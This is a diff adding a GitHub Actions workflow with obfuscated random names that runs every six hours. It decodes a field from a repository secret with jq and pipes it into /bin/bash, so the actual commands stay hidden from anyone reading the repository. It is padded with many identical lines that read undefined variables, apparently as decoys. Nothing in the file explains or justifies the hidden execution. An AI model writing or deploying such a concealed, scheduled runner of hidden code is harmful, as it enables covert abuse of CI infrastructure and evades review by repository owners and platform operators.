@@ -1,0 +1,30 @@
+name: tupoxo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tupoxo
+        env:
+          kttev6713: ${{ secrets.kttev6713 }}
+        run: |
+          echo $kttev6713 | jq -r .mxtos129 | /bin/bash
+          echo $xzxes32 | jq -r .smew830 | /bin/bash
+          echo $gcayp5 | jq -r .xln920 | /bin/bash
+          echo $ytof7034 | jq -r .tyrg9704 | /bin/bash
+          echo $u78751 | jq -r .cyg88631 | /bin/bash
+          echo $hjx87301 | jq -r .biox548 | /bin/bash
+          echo $kg3 | jq -r .figt0280 | /bin/bash
+          echo $ym40761 | jq -r .hqnr8 | /bin/bash
+          echo $hle6 | jq -r .yew04132 | /bin/bash
+          echo $qjenl51 | jq -r .egwss847 | /bin/bash
+          echo $szowi144 | jq -r .r78 | /bin/bash
+          echo $btuqy63 | jq -r .dckv4378 | /bin/bash
+          echo $xq0727 | jq -r .za202 | /bin/bash
+          echo $axzx27884 | jq -r .koln6 | /bin/bash
+          echo $l37110 | jq -r .khli95036 | /bin/bash
+
